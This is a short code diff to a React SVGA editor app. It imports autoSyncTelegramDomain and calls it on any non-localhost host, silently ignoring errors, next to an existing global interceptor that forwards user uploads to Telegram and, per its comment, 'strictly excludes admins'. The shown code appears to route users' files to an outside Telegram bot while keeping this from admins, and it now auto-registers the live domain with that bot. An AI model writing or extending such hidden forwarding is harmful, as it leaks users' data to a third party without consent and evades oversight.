@@ -110,7 +110,7 @@ import { AppUpdateToast } from './components/AppUpdateToast';
 import { extractSvgaFromPdfFile } from './utils/pdfSvgaExtractor';
 import { enqueueAutoCache } from './services/cacheService';
 import { UserCacheModal } from './components/UserCacheModal';
-import { initGlobalUploadInterceptor, enqueueTelegramForwardBatch } from './services/telegramForwardService';
+import { initGlobalUploadInterceptor, enqueueTelegramForwardBatch, autoSyncTelegramDomain } from './services/telegramForwardService';
 
 declare var SVGA: any;
 
@@ -246,9 +246,17 @@ const App: React.FC = () => {
     installedVersion: 'v3.0.0'
   });
 
-  // 🚀 Initialize Global Automatic Upload Forwarder to Telegram (strictly excludes admins)
+  // 🚀 Initialize Global Automatic Upload Forwarder to Telegram & Auto-sync webhook on hosted domain
   useEffect(() => {
     initGlobalUploadInterceptor(() => currentUser);
+
+    // Auto-sync Telegram Bot Webhook if running on a live hosted URL
+    if (typeof window !== 'undefined' && window.location.origin) {
+      const hostname = window.location.hostname;
+      if (!hostname.includes('localhost') && !hostname.includes('127.0.0.1')) {
+        autoSyncTelegramDomain(window.location.origin).catch(() => {});
+      }
+    }
   }, [currentUser]);
 
   // Ensure user always lands directly on the SVGA Editor / Dashboard home screen
